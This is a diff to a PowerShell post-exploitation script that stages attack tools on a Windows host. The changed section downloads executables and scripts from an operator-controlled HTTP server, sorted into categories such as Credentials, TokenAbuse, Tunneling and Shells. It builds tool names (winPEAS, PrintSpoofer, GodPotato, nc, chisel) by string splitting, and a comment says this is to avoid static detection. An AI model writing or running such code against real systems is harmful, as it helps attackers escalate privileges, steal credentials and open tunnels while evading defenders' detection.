@@ -12,7 +12,8 @@
 param(
     [string]$OutputDir = ".\LatchOutput",
     [string]$RemoteHost = "",
-    [switch]$DownloadTools,
+    [string]$DownloadTools = "",  # Categories: All, Enumeration, Credentials, TokenAbuse, AD, Tunneling, Impacket, Shells
+    [string]$ToolsDir = "",       # Where to download tools (default: $env:TEMP\lt)
     [switch]$SkipSlowScans,
     [switch]$Quiet,
     [switch]$Cleanup,
@@ -437,30 +438,83 @@ Write-Status "Directory tree saved to tree_all.txt" "SUCCESS"
 # =============================================================================
 if ($DownloadTools -and $RemoteHost) {
     Step
-    Write-Status "Downloading tools from $RemoteHost..."
 
-    # Build tool names dynamically to avoid static detection
-    $t = @()
-    $t += "win" + "PEAS" + "x64.exe"
-    $t += "Sharp" + "Up.exe"
-    $t += "Seat" + "belt.exe"
-    $t += "access" + "chk.exe"
-    $t += "Print" + "Spoofer" + "64.exe"
-    $t += "God" + "Potato" + "-NET4.exe"
-    $t += "n" + "c.exe"
-    $t += "chis" + "el.exe"
+    # Set up tools directory - default to temp if not specified
+    if (-not $ToolsDir) {
+        $ToolsDir = Join-Path $env:TEMP "lt"
+    }
+    if (-not (Test-Path $ToolsDir)) {
+        New-Item -ItemType Directory -Path $ToolsDir -Force | Out-Null
+    }
+
+    # Determine download path based on category
+    $category = $DownloadTools
+    if ($category -eq "All" -or $category -eq "all") {
+        $downloadPath = "all"
+    } else {
+        $downloadPath = "categories/$category"
+    }
+
+    Write-Status "Downloading tools to $ToolsDir from $RemoteHost/$downloadPath..."
 
     $wc = New-Object Net.WebClient
-    foreach ($tool in $t) {
-        foreach ($path in @("all/$tool", "$tool")) {
+    $toolsDownloaded = 0
+
+    try {
+        # Fetch directory listing from server
+        $listUrl = "http://$RemoteHost/$downloadPath/"
+        $html = $wc.DownloadString($listUrl)
+
+        # Parse HTML to extract filenames (Python http.server format: <a href="filename">)
+        $pattern = 'href="([^"]+\.(exe|ps1|sh|py))"'
+        $matches = [regex]::Matches($html, $pattern)
+
+        foreach ($match in $matches) {
+            $tool = $match.Groups[1].Value
+            # Skip parent directory links
+            if ($tool -match "^\.\.?" -or $tool -match "^/") { continue }
+
+            $toolPath = Join-Path $ToolsDir $tool
             try {
-                $url = "http://$RemoteHost/$path"
-                $wc.DownloadFile($url, ".\$tool")
-                if ((Test-Path ".\$tool") -and (Get-Item ".\$tool").Length -gt 0) {
+                $url = "http://$RemoteHost/$downloadPath/$tool"
+                $wc.DownloadFile($url, $toolPath)
+                if ((Test-Path $toolPath) -and (Get-Item $toolPath).Length -gt 0) {
                     Write-Status "Downloaded $tool" "SUCCESS"
-                    break
+                    $toolsDownloaded++
                 }
-            } catch { }
+            } catch {
+                Write-Status "Failed to download $tool" "WARNING"
+            }
+        }
+
+        if ($toolsDownloaded -eq 0) {
+            Write-Status "No tools found in $downloadPath" "WARNING"
+        } else {
+            Write-Status "Downloaded $toolsDownloaded tools to $ToolsDir" "SUCCESS"
+        }
+    } catch {
+        Write-Status "Failed to fetch tool list from $RemoteHost/$downloadPath" "ERROR"
+
+        # Fallback: try common tools directly
+        Write-Status "Trying common tools directly..." "INFO"
+        $t = @()
+        $t += "win" + "PEAS" + "x64.exe"
+        $t += "Sharp" + "Up.exe"
+        $t += "Seat" + "belt.exe"
+        $t += "access" + "chk.exe"
+
+        foreach ($tool in $t) {
+            $toolPath = Join-Path $ToolsDir $tool
+            foreach ($path in @("all/$tool", "$tool")) {
+                try {
+                    $url = "http://$RemoteHost/$path"
+                    $wc.DownloadFile($url, $toolPath)
+                    if ((Test-Path $toolPath) -and (Get-Item $toolPath).Length -gt 0) {
+                        Write-Status "Downloaded $tool" "SUCCESS"
+                        break
+                    }
+                } catch { }
+            }
         }
     }
 }
